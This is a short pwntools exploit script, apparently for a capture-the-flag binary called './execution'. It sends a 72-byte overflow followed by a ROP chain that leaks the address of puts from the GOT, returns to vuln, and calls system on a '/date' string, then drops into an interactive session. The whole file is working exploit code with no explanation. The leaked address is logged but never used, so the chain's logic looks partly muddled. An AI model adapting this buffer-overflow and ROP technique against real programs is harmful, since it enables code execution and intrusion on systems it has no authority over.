#!/usr/bin/python3
from pwn import *

context.arch = "amd64"

offset = 72

elf = ELF("./execution")
p = elf.process()


rop = ROP(elf)
rop.call(elf.symbols['puts'], [elf.got['puts']])
rop.call(elf.symbols['vuln'])
rop.call("puts", [ next(elf.search(b"/date\x00"))])
rop.call(elf.symbols['system'], [ next(elf.search(b"/date\x00"))])

log.info(p.recvuntil("\n"))
log.info(p.recvuntil("\n"))

payload = [
    b"A" * offset,
    rop.chain()
]

payload = b"".join(payload)
p.sendline(payload)

puts = u64(p.recvuntil("\n").rstrip().ljust(8,b"\x00"))
log.info(f"puts found at {hex(puts)}")


p.interactive()